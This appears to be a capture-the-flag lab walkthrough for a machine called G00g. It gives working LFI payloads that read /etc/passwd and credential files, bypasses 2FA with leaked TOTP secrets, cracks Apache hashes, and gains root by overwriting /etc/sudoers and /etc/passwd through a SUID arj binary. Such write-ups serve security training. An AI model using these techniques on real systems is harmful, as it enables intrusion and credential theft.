@@ -1,0 +1,266 @@
+																							                     G00g Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.221.196
+export IP=192.168.221.196
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Port 80
+# We are immediately blocked by the authentication protocol. However let's try to common credentials
+
+admin : root
+admnistrator : password
+root : toor
+admin : admin
+
+# Inspect the source code, we find a comment: 
+
+itemir/apache_2fa
+
+# Searched online for itemir/apache_2fa and found this github repository.
+
+https://github.com/itemir/apache_2fa
+
+# We notice that In order to obtain Authentication Token, download Google Authenticator for iOS or Android and create a profile by using ND4LKCSFMUQISO6CBZQATLDP secret key
+
+https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai?hl=en                         # Chrome extension
+
+or 
+
+https://addons.mozilla.org/ro/firefox/addon/auth-helper/                                         # Firefox extension
+
+# Click on top right Edit and create a new account and use the secret key ND4LKCSFMUQISO6CBZQATLDP. You will get the secret code which will allow you to pass the apache2FA!
+
+
+
+# After we pass the 2FA, we are presented with a drop down menu and a view option. 
+
+
+
+# Once you click on View result, we notice the view parameter, let's try to see if command injectio or LFI is possible. 
+http://192.168.190.144/spool/viewresult.php?view=192.168.45.5_1681408146.txt
+
+
+http://192.168.190.144/spool/viewresult.php?view=/etc/passwd                          # bingo  
+
+# We can use php filter as well!
+
+http://192.168.190.144/spool/viewresult.php?view=../../../etc/passwd                   # no luck
+http://192.168.190.144/spool/viewresult.php?view=php://filter/convert.base64-encode/resource=/etc/passwd             # bingo    
+
+root:x:0:0:root:/root:/bin/bash
+--------------------------------------------------
+fox:x:1000:1000::/home/fox:/bin/sh
+
+# Ok, now that we have confirmed LFI, let's check for other sensitive files
+
+http://192.168.190.144/spool/viewresult.php?view=php://filter/convert.base64-encode/resource=/home/fox/.ssh/id_rsa   
+http://192.168.190.144/spool/viewresult.php?view=php://filter/convert.base64-encode/resource=/home/fox/.ssh/authorized_keys
+
+
+# This is taking too long, let's take the easy route and brute-force the sucker using a wordlist /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+   Let's use burpsuite intruder
+   
+GET /spool/viewresult.php?view=php://filter/convert.base64-encode/resource=$/proc/self/environ$ HTTP/1.1
+
+
+
+GET /spool/viewresult.php?view=$/proc/self/environ$ 
+
+# Since we know we have the user fox, we can grab the flag directly 
+
+GET /spool/viewresult.php?view=/home/fox/local.txt                          # Flag: 0c9452c7a291e7edc2d8431a668cf1be
+
+
+# Let's see if we can get shell by getting more information. Looking at the /etc/apache2/apache2.conf file, we notice that virtual hosts are enabled!
+
+GET /spool/viewresult.php?view=/etc/apache2/apache2.conf 
+
+# Include the virtual host configurations:
+IncludeOptional sites-enabled/*.conf
+
+# While searching online, we found out that when virtua hosts are enabled, these is a default configuration file /etc/apache2/sites-available/000-default.conf
+   We notice a specific configuration file for apache_2fa.
+
+GET /spool/viewresult.php?view=/etc/apache2/sites-available/000-default.conf
+
+<Directory /opt/apache_2fa>
+    AuthType Basic
+    AuthName "offsec"
+    AuthUserFile /opt/apache_2fa/apache_credentials
+    Require valid-user
+</Directory>
+
+
+GET /spool/viewresult.php?view=/opt/apache_2fa/apache_credentials
+
+admin:$apr1$pa.RhgPO$18S/xeIW24UvBgjVJJXiC1
+fox:$apr1$JWr/q2vH$KXhhk03ukqkoXjbOIoUVp/
+
+# Nice! Let's try to “crack” the hashes. Check on https://hashcat.net/wiki/doku.php?id=example_hashes to see which type of hash is it.
+
+1600	Apache $apr1$ MD5, md5apr1, MD5 (APR) 2	$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.
+
+# Let's try with both hashcat and john to see how things go.
+
+nano hash.txt
+$apr1$JWr/q2vH$KXhhk03ukqkoXjbOIoUVp/
+$apr1$pa.RhgPO$18S/xeIW24UvBgjVJJXiC1
+
+hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt                    
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   
+
+admin:admin
+fox:THERESE    
+
+# Not sure what's with the admin account but let's try to connect to SSH. As expected, admin / admin didn't work, however fox / THERESE work on SSH. But we have a problem boys, aparently we need a verification token, I can only presume it's similar to the original one that was used to bypass apache 2FA. But it seems that we need the secret key for FOX and not the default secret key.
+
+ssh fox@$IP
+(fox@192.168.190.144) Password: THERESE
+(fox@192.168.190.144) Verification code:
+
+# Go back to the github page https://github.com/itemir/apache_2fa and notice the line “If the test is successful, edit apache_credentials and tokens.json files and remove test_user.”
+
+GET /spool/viewresult.php?view=/opt/apache_2fa/tokens.json
+
+"admin": "ND4LKCSFMUQISO6CBZQATLDP",
+  "fox": "RTW2ARWLJZRWUCN54UO22FDQ6I"
+
+# Use the TOTP authenticator chrome extension and create a new account fox with the secret key RTW2ARWLJZRWUCN54UO22FDQ6I and generate a code to login into SSH.
+   Successfully logged in!
+   
+cat local.txt                          # Flag: 0c9452c7a291e7edc2d8431a668cf1be
+
+
+Privilege escalation
+
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/arj
+
+Method 1: Modify the sudoers file and give us sudo permission to execute any command as root.
+# Archive the /etc/sudoers file
+
+arj a archive /etc/sudoers
+
+# Read the archive
+
+arj p archive.arj
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+OK     
+
+# Create a new sudoers file and add the fox user..  
+
+nano sudoers
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+fox ALL=(ALL:ALL) NOPASSWD:ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+OK
+
+# Archive the sudoers file that you've created with the new content
+
+arj a sudoers sudoers
+
+# Now, you need to overwrite the sudoers file from /etc/ directory with the one you've just created containing the sudo rights for user fox. You will be asked to overwrite it. 
+
+arj e sudoers.arj "/etc"
+
+# Getting root
+
+sudo su
+root@g00g:~# id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/proof.txt                                                                  # Flag: c453381d06a56edb5f910f875551321f
+
+
+
+Method 2: Overwriting the /etc/passwd file
+
+# Since we have read rights on the file we don't need to create an archive of the file, just copy the contents
+
+cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+Debian-exim:x:106:113::/var/spool/exim4:/usr/sbin/nologin
+fox:x:1000:1000::/home/fox:/bin/sh
+
+# Create a new passwd file and add one more line to it giving your root rights
+
+nano passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+.............................................................
+fox:x:1000:1000::/home/fox:/bin/sh
+urs:$1$59od9r.n$mYs3rGkuviFFkes4F7L5Z/:0:0:urs:/home/urs:/bin/bash
+
+# Archive the new passwd file
+
+arj a passwd passwd
+
+# Overwrite the original /etc/passwd file with your new modified archived passwd file
+
+arj e passwd.arj "/etc"
+
+# Now switch to the urs user who is admin and use the password 1234
+
+su urs
+Password: 1234
+id
+uid=0(root) gid=0(root) groups=0(root)
